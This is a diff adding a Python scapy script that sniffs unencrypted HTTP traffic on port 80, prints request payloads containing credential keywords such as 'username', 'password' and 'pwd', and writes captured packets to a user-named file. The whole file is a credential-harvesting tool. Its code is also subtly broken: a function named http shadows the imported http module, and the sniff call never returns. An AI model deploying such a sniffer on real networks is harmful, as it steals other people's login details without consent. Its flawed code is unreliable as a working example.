@@ -1,0 +1,41 @@
+import scapy.all as scapy
+from scapy.layers import http
+
+def http():
+    def sniff(interface):
+        packets = []
+        scapy.sniff(iface=interface, store=False, prn=lambda pkt: packets.append(pkt), filter="port 80")
+        return packets
+
+    def process_sniffed_packet(packet):
+        if packet.haslayer(http.HTTPRequest):
+            if packet.haslayer(scapy.Raw):
+                load = packet[scapy.Raw].load.decode()  # Convert bytes to string using decode()
+                keywords = ["username", "user", "login", "password", "pass", "usr", "userID", "uname", "email",
+                            "userPassword", "pswd", "pwd"]
+                for keyword in keywords:
+                    if keyword in load:
+                        print(load)
+                        break
+
+    packets = sniff("eth0")
+
+    while True:
+        user_input = input("[s] Stop sniffing \n[f] Save the result\n[c] Continue sniffing\n")
+        if user_input.lower() == 's':
+            break
+        elif user_input.lower() == 'f':
+            file_name = input("Enter a file name to save the output: ")
+            with open(file_name, 'w') as f:
+                for packet in packets:
+                    process_sniffed_packet(packet)
+                    f.write(str(packet))  # Save the packet details to the file
+                    f.write('\n')
+            print('Result saved to file:', file_name)
+            break
+        elif user_input.lower() == 'c':
+            continue
+        else:
+            print("Invalid input. Please try again.")
+
+http()
